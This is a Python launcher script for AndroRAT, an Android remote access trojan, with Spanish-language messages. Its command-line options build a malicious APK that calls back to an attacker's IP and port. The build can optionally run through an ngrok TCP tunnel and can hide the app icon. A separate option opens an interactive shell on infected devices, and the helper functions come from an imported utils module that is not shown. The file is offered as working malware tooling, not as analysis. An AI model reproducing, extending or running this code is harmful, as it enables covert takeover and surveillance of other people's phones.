#!/usr/bin/python
# -*- coding: utf-8 -*-

from utils import *
import argparse
import sys
import platform

try:
    from pyngrok import ngrok, conf
except ImportError as e:
    print(stdOutput("error")+"\033[1mpyngrok not found")
    print(stdOutput("info")+"\033[1mRun pip3 install -r requirements.txt")
    exit()

clearDirec()

# Usar raw string para evitar SyntaxWarning
banner_art = r"""
                    _           _____         _______
    /\             | |         |  __ \     /\|__   __|
   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
 / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|
                                        - By karma9874
"""

parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build', help='For Building the apk', action='store_true')
parser.add_argument('--shell', help='For getting the Interpreter', action='store_true')
parser.add_argument('--ngrok', help='For using ngrok', action='store_true')
parser.add_argument('-i', '--ip', metavar="<IP>", type=str, help='Enter the IP')
parser.add_argument('-p', '--port', metavar="<Port>", type=str, help='Enter the Port')
parser.add_argument('-o', '--output', metavar="<Apk Name>", type=str, help='Enter the apk Name')
parser.add_argument('-icon', '--icon', help='Visible Icon', action='store_true')
args = parser.parse_args()

# Validación de versión de Python
python_version = float(platform.python_version()[:3])
if python_version < 3.6 or python_version > 3.13:
    print(stdOutput("warning")+"\033[1mPython version recomendada: 3.6 a 3.11")

if args.build:
    port_ = args.port
    icon = True if args.icon else None
    
    if args.ngrok:
        try:
            conf.get_default().monitor_thread = False
            port = 8000 if not port_ else int(port_)
            
            print(stdOutput("info")+"\033[0mConectando a ngrok...")
            tcp_tunnel = ngrok.connect(port, "tcp")
            ngrok_process = ngrok.get_ngrok_process()
            
            # Extraer dominio e IP del túnel
            domain, port_str = tcp_tunnel.public_url[6:].split(":")
            ip = socket.gethostbyname(domain)
            
            print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s" % (ip, port_str))
            build(ip, port_str, args.output, True, port_, icon)
        except Exception as e:
            print(stdOutput("error")+"\033[1mNgrok error: %s" % str(e))
            print(stdOutput("info")+"\033[1mUsa IP y puerto manual en su lugar")
            if args.ip and args.port:
                build(args.ip, args.port, args.output, False, None, icon)
    else:
        if args.ip and args.port:
            build(args.ip, args.port, args.output, False, None, icon)
        else:
            print(stdOutput("error")+"\033[1mArgumentos faltantes")
            print(stdOutput("info")+"\033[1mUso: python3 androRAT.py --build -i <IP> -p <PORT> -o <APK_NAME>")

if args.shell:
    if args.ip and args.port:
        try:
            get_shell(args.ip, args.port)
        except KeyboardInterrupt:
            print("\n" + stdOutput("info") + "\033[1mShell cerrado")
            sys.exit()
    else:
        print(stdOutput("error")+"\033[1mArgumentos faltantes")
        print(stdOutput("info")+"\033[1mUso: python3 androRAT.py --shell -i <IP> -p <PORT>")
